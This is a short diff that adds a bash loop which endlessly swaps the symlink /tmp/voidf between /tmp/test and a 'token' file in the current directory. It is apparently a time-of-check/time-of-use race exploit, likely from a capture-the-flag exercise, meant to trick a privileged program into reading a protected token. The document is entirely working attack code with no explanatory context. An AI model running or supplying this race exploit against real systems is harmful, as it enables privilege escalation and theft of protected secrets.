@@ -1,0 +1,5 @@
+while true;
+do
+ln -sf /tmp/test /tmp/voidf;
+ln -sf $(pwd)/token /tmp/voidf;
+done
